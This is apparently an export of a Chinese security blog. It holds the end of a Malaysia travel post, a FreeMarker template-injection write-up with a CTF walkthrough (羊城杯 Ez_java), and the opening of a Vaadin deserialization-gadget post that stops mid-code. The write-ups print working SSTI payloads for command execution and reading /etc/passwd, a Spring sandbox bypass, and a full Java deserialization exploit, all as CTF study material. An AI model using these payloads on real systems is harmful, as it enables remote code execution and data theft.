src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436916.jpg" alt="afa27d4e0f7c098f23c1edccf4fc525"></p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436106.jpg" alt="a9520cafb09ca5a6ff94eacfdcd06ff">​​</p></li><li><p>lmgo商场(就卖奢侈品？？？)</p></li></ol><p>‍</p><h1 id="必吃小吃个人体验"><a href="#必吃小吃个人体验" class="headerlink" title="必吃小吃个人体验"></a>必吃小吃个人体验</h1><ol><li><p>印度飞饼(salim) (好饱没吃到)</p></li><li><p>大茄来海鲜(除了贵没啥感觉)</p></li><li><p>sasa seafood (超级推荐！性价比很高很多人很好吃)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436552.jpg" alt="118b4b283707c212f16aeefca39d565">​</p></li><li><p>肉骨茶(佑记肉骨茶&#x2F;宜丰茶室)(勾八这个真的要喷全勾八肥猪肉+药材汤？我根本想不明白哪里好吃了还贼多人)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171437034.jpg" alt="a8d8051441c8b17ca6a503db3d74a9c">​</p></li></ol><p>‍</p><h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><p>本人英语水平46级左右，能够正常交流的其实，就是不一定要说完句子，比如某些字眼能懂就行，反正我基本跟本地司机无障碍沟通的，就是去哪里，有什么好玩的都能正常沟通，不是很费劲，就是他们的English是TMD带口音的听着刺耳，然后其实很多人还有很多导游都是普通话 + 粤语 + 客家话 + English + 马来语自由切换很牛逼的，所以马来语言还是非常OK的</p><p>‍</p><h1 id="费用"><a href="#费用" class="headerlink" title="费用"></a>费用</h1><p>这应该是大家最关心的问题了，因为我是定制游 + 春节出行 所以价格稍微贵点，这个图的全部费用都涵盖了，人均6.4k ，没有算到去当地的cash费用，如果是非旺季+能够买到便宜的机票的话一个人可以控制在4k左右的全部花销，还是非常值得体验的，其实大部分都是花在了吃上，三顿海鲜 + 一次Massge就已经花了2kRM了，算是奢侈的花销了</p><p>‍</p><p>以下是我的五天记账记录仅供参考</p><h4 id="First"><a href="#First" class="headerlink" title="First"></a>First</h4><p>电话卡 RMB 144.36</p><p>海鲜 398 RM</p><p>税费 120(住房)</p><p>打车 13+15</p><p>‍</p><h4 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h4><p>拖鞋 50</p><p>两只水 3</p><p>椰汁14</p><p>晚上小卖部胡须刀+零食 29</p><p>‍</p><h4 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h4><p>打车 5</p><p>奶茶 21.6</p><p>电玩 12</p><p>午饭 13 + 17 + 4+30</p><p>打车 6</p><p>spa 540</p><p>晚饭海鲜 426</p><p>鱼干 50</p><p>芒果水和椰汁水 8 水5块</p><p>打车 20</p><p>打车 16</p><p>‍</p><h4 id="Fourth"><a href="#Fourth" class="headerlink" title="Fourth"></a>Fourth</h4><p>下水拍照 150</p><p>晚饭 496.6</p><p>榴莲 45</p><p>山竹 13</p><p>‍</p><h4 id="Last"><a href="#Last" class="headerlink" title="Last"></a>Last</h4><p>肉骨茶 112</p><p>炸鸡 19.4</p><p>水果 22</p><p>晚饭 海盐鸡饭100</p><p>m记 12</p><p>sasa 39</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - FreeMarker模版注入浅析</title>
    <link href="/post/java-security-freemarker-template-injection-shallow-analysis-mqvp1.html"/>
    <url>/post/java-security-freemarker-template-injection-shallow-analysis-mqvp1.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前面试的时候问到一个很偏的问题，”请你说说Java的模版注入吧” 当时懵逼了一会儿答了FreeMarker和Thymeleaf以及Velocity，但是当时没有研究过只是知道有这三个玩意，今天刚好掏出半年前的题目来看下FreeMarker的模版注入吧</p><p>‍</p><p>‍</p><h1 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h1><p>‍</p><h3 id="什么是模版引擎"><a href="#什么是模版引擎" class="headerlink" title="什么是模版引擎"></a>什么是模版引擎</h3><p>就是前端有个模板页面，然后通过”变量符&#x2F;指令&#x2F;插值”进行占位，后端查询回来的数据可以动态的向这些占位处填充实际数据</p><p>‍</p><h3 id="FreeMarker结构"><a href="#FreeMarker结构" class="headerlink" title="FreeMarker结构"></a>FreeMarker结构</h3><ul><li>文本</li><li>插值</li><li>FTL标签</li><li>注释</li></ul><p>​</p><h3 id="Freemarker配置"><a href="#Freemarker配置" class="headerlink" title="Freemarker配置"></a>Freemarker配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">server.port=8888<br># 模板后缀名<br>spring.freemarker.suffix=.ftl<br># 文档类型<br>spring.freemarker.content-type=text/html<br># 页面编码<br>spring.freemarker.charset=UTF-8<br># 页面缓存<br>spring.freemarker.cache=false<br># 模板路径<br>spring.freemarker.template-loader-path=classpath:/templates/<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="Freemarker模版"><a href="#Freemarker模版" class="headerlink" title="Freemarker模版"></a>Freemarker模版</h3><p>index.ftl</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Zjacky<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;username&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;password&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="内置函数危险使用"><a href="#内置函数危险使用" class="headerlink" title="内置函数危险使用"></a>内置函数危险使用</h3><p>在模板引擎渲染模板时，如果模板中存在恶意代码，进而会在渲染时执行恶意代码。不同的模板触发漏洞的场景也不同</p><p>FreeMarker是存在api 和new的内建函数能够进行命令执行</p><p>‍</p><h4 id="api"><a href="#api" class="headerlink" title="api"></a><span style="font-weight: bold;" data-type="strong">api</span></h4><p>‍</p><p>api 函数必须在配置项 <code>api_builtin_enabled</code>​ 为 <code>true</code>​ 时才有效，而该配置在2.3.22*版本之后默认为 false</p><p>‍</p><p>我们可以通过 api 内建函数获取类的 classloader 然后加载恶意类，或者通过Class.getResource 的返回值来访问 URI 对象。 URI 对象包含 toURL 和 create 方法，我们通过这两个方法创建任意 URI ，然后用 toURL 访问任意URL</p><p>‍</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsp"><span class="hljs-comment">// 加载恶意类</span><br>&lt;#assign classLoader=object?api.class.getClassLoader()&gt;$&#123;classLoader.loadClass(<span class="hljs-string">&quot;Evil.class&quot;</span>)&#125;<br><br><span class="hljs-comment">// 读取任意文件</span><br>&lt;#assign uri=object?api.class.getResource(<span class="hljs-string">&quot;/&quot;</span>).toURI()&gt;<br>  &lt;#assign input=uri?api.create(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;<br>  &lt;#assign is=input?api.getInputStream()&gt;<br>  FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>      &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>      &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>          &lt;#<span class="hljs-keyword">break</span>&gt;<br>      &lt;/#<span class="hljs-keyword">if</span>&gt;<br>  $&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="new"><a href="#new" class="headerlink" title="new"></a><span style="font-weight: bold;" data-type="strong">new</span></h4><p>‍</p><p>主要是寻找实现了TemplateModel 接口的可利用类来进行实例化 <span style="font-weight: bold;" data-type="strong">。</span>​<code>freemarker.template.utility</code>​ 包中存在三个符合条件的类，分别为</p><ul><li>Execute 类</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>‍</p><ul><li>ObjectConstructor类</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;calc.exe&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure><p>‍</p><ul><li>JythonRuntime 类</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;&lt;<span class="hljs-meta">@value</span>&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc.exe&quot;</span>)&lt;/<span class="hljs-meta">@value</span>&gt;<span class="hljs-comment">//@value为自定义标签</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>下面通过一个题来理解下Java的SSTI</p><h1 id="2023-羊城杯-Ez-java​​"><a href="#2023-羊城杯-Ez-java​​" class="headerlink" title="2023 - 羊城杯 - Ez_java​​"></a>2023 - 羊城杯 - Ez_java​​</h1><p>‍</p><p>考点：</p><ol><li>Java动态代理</li><li>Java反序列化</li><li>Java - freemaker模板注入(绕过Spring沙箱)</li></ol><p>‍</p><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><p>打开依赖发现只有一个组件就是<code>freemaker</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546023.png" alt="image">​</p><p>‍</p><p>而且题目也给了一个目录里面存在<code>ftl</code>​文件，所以很容易想到就是打<code>freemaker</code>​模版注入，那么看看怎么上传<code>ftl</code>​文件</p><p>‍</p><p>这里再看下配置文件发现用了Spring的一个内置沙箱来防止模版注入</p><p>具体可以参考<a href="https://www.cnblogs.com/escape-w/p/17326592.html">https://www.cnblogs.com/escape-w/p/17326592.html</a></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546315.png" alt="image">​</p><p>‍</p><p>先看文件目录</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546455.png" alt="image">​</p><p>‍</p><h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>‍</p><p>可以看到有个upload类看下代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546596.png" alt="image">​</p><p>只能上传<code>.ftl</code>​文件，那就是想到覆盖<code>index.ftl</code>​文件了，往上看如何调用</p><p>于是找到<code>HtmlMap#get()</code>​方法，传<code>filename</code>​ <code>content</code>​属性</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546798.png" alt="image">​</p><p>在往上跟谁调用了get方法找到<code>HtmlInvocationHandler#invoke()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546965.png" alt="image">​</p><p>这明显是一个代理类，存在invoke方法，在学习动态代理或者CC1的LazyMap的时候就知道这个<code>InvocationHandler</code>​就是动态代理的调用处理器，当使用代理对象的某个方法的 时候就会默认调用这个重写的<code>invoke</code>​方法，如下图</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546120.png" alt="image">​</p><p>然后看控制器</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546260.png" alt="image">​</p><p>发现<code>/templating</code>​触发<code>index.ftl</code>​</p><p><code>/getflag</code>​ 直接裸字节流反序列化</p><p>‍</p><p>那么结合一下CC1的后半条链子，整条思路链就构造完毕了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject()-&gt;HtmlInvocationHandler#invoke()-&gt;HtmlMap#get()-&gt;HtmlUploadUtil#uploadfile()<br></code></pre></td></tr></table></figure><p>‍</p><p>绕过沙箱的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;<br>  &lt;#assign fc=ac.getBean(<span class="hljs-string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;<br>    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;<br>      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;id&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>然后访问ssti templating?name&#x3D;xxx即可打成功</p><p>最终EXP的思路为</p><ol><li>构造<code>htmlMap</code>​需要上传的属性<code>filename</code>​ 为<code>index.ftl</code>​ <code>content</code>​ 为恶意的SSTI payload</li><li>new一个<code>htmlMap</code>​的处理器包裹</li><li>CC1后半条链子，通过<code>AnnotationInvocationHandler</code>​触发动态代理的调用处理器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ycbjava;<br><span class="hljs-keyword">import</span> com.ycbjava.Utils.HtmlInvocationHandler;<br><span class="hljs-keyword">import</span> com.ycbjava.Utils.HtmlMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">YCBPoC</span> &#123;<br>  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HtmlMap</span> <span class="hljs-variable">htmlMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlMap</span>();<br>        htmlMap.filename=<span class="hljs-string">&quot;index.ftl&quot;</span>;<br>        htmlMap.content=<span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;whoami\&quot;)&#125;\n&quot;</span>;<br>        <span class="hljs-type">HtmlInvocationHandler</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlInvocationHandler</span>(htmlMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(YCBPoC.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, html);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        a.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> a.newInstance(Target.class, proxy);<br>        System.out.println(serial(exp));<br>        deserial(serial(exp));<br>    <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">stream1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(stream);<br>        stream1.writeObject(o);<br>        stream1.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(stream.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        o.readObject();<br>        o.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将结果打入</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546417.png" alt="image">​</p><p>‍</p><p>然后去触发<code>index.ftl</code>​​即可执行命令<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402091546571.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - Learning Vaadin Gadget From CTF</title>
    <link href="/post/java-safety-learning-vaadin-gadget-from-ctf-z1imvgg.html"/>
    <url>/post/java-safety-learning-vaadin-gadget-from-ctf-z1imvgg.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章发布在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13941">https://xz.aliyun.com/t/13941</a></p><p>要过年了忙得起飞大年初三就飞马来潜水去了于是为了不让身边的师傅卷死我就去看了下之前没打出来的CTF题目心血来潮来复现学习下，刚好遇到新的链子，就一并写篇博客记录下，标题很洋气，从CTF中学习Vaadin gadgets</p><p>‍</p><h1 id="Vaadin链"><a href="#Vaadin链" class="headerlink" title="Vaadin链"></a>Vaadin链</h1><p>‍</p><p>Vaadin 可以理解为是一个平台吧，有UI，了解即可，Vaadin 的反序列化调用链其实蛮简单的，就是反射调用 <code>getter</code>​ 方法罢了</p><p>‍</p><p>依赖</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">vaadin-server :</span> <span class="hljs-number">7.7</span><span class="hljs-number">.14</span><br><span class="hljs-attr">vaadin-shared :</span> <span class="hljs-number">7.7</span><span class="hljs-number">.14</span><br></code></pre></td></tr></table></figure><p>‍</p><p>漏洞其实就三个类</p><p>‍</p><h3 id="NestedMethodProperty"><a href="#NestedMethodProperty" class="headerlink" title="NestedMethodProperty"></a>NestedMethodProperty</h3><p><code>com.vaadin.data.util.NestedMethodProperty</code>​ 类可以理解为是一个封装属性方法的类，其构造方法如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334764.png" alt="image">​</p><p>接收两个参数，一个是实例化的对象，一个是属性值。然后调用初始化方法将调用 <code>initialize</code>​ 方法获取实例类中的相关信息存放在成员变量中。跟进该初始化方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334063.png" alt="image">​</p><p>发现已经获取到了我们传入的属性值的getter方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334266.png" alt="image">​</p><p>并且进行对象属性的一些赋值封装</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334777.png" alt="image">​</p><p>然后这个<code>NestedMethodProperty</code>​ 类 存在 <code>getValue</code>​ 方法</p><p>将我们上述封装的<code>getMethods</code>​这个方法数组类进行遍历且调用里面的属性的方法名</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334942.png" alt="image">​</p><p>‍</p><p>因此这个类又是可以触发 TemplatesImpl 的利用方式，所以找哪个类存在 能够触发<code>NestedMethodProperty#getvalue()</code>​去调用getter方法，于是找到下面的类</p><p>‍</p><h3 id="PropertysetItem"><a href="#PropertysetItem" class="headerlink" title="PropertysetItem"></a>PropertysetItem</h3><p>‍</p><p>触发类是 <code>com.vaadin.data.util.PropertysetItem</code>​ ，这个类实现了几个接口，初始化后能够对自己的map属性，list属性进行操作</p><p>数据存放在成员变量 map 中，想要获取相应属性时，则调用 <code>getItemProperty</code>​ 方法在 map 中获取，需要传入一个对象</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334109.png" alt="image">​</p><p>‍</p><p>而这个类重点则是他存在<code>toString</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334265.png" alt="image">​</p><p>‍</p><p>从list中获取值然后去调用<code>getValue</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334418.png" alt="image">​</p><p>‍</p><p>那么这个list怎么赋值呢，可以关注<code>addItemProperty</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334575.png" alt="image">​</p><p>将我们传入的id值传入</p><p>‍</p><p>断点看下这个​<code>getItemPropertyIds</code>​的返回值是什么</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334741.png" alt="image">​</p><p>其实可以发现他返回的就是我们<code>list</code>​的内容</p><p>那之后取出list的内容后再从map中去找对应的值去调用我们的getvalue方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334914.png" alt="image">​</p><p>‍</p><p>那么现在目的就是</p><ol><li>list有一个需要调用他的getter方法的id</li><li>map也需要一个调用他的getter方法的id并且取出来的值为<code>NestedMethodProperty</code>​类来调用他的getvalue方法</li></ol><p>那其实就已经非常好去拼接了</p><p>‍</p><p>最后的问题就是如何在反序列化的时候调用任意类的<code>Tostring</code>​方法了，而在我们的CC5当中就接触过这个类叫<code>BadAttributeValueExpException</code>​，他的反序列化是可以调用任意类的<code>ToString</code>​方法的，于是参考SU18师傅的EXP成功弹出计算机</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Vaadin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.NestedMethodProperty;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.PropertysetItem;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span 